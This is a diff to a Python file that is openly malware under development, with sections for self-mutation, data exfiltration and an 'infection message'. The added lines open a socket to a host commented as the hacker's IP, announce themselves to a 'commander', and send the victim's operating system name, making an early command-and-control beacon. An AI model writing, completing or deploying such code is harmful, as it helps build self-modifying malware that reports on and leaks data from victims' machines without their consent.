@@ -1,11 +1,14 @@
+import socket
+import sys
+import time
+import platform
+
 # ----------- Variables -----------
+host = '127.0.0.1' #Hacker's IP address as a string
+port = 9999
+target_os = platform.system()
 
-
-
-  
 # ----------- Functions ----------- 
-
-
 
 # -- Self Mutation Functions -- 
 #region
@@ -65,13 +68,34 @@ def swap_variables(code):
     }
 #endregion
 
+# -- Data Exfiltration --
+#region
+
+"""
+function: send_data
+
+A wrapper for socket.send() which encodes automatically in utf-8.
+
+"""
+def send_data(s, data):
+    s.send(f"{data}".encode('utf-8'))
+
+#endregion
+
 # ----------- Main Operations ----------- 
 
 # (1) Retrieve host OS information.
 
 
 # (2) Establish connection with commander.
+s = socket.socket()
+s.connect((host, port))
 
+s.send("Hello Command!\n".encode('utf-8'))
+
+time.sleep(1)
+
+send_data(s, f"Target OS: '{str(target_os)}'")
 
 # (3) Send infection message.
 
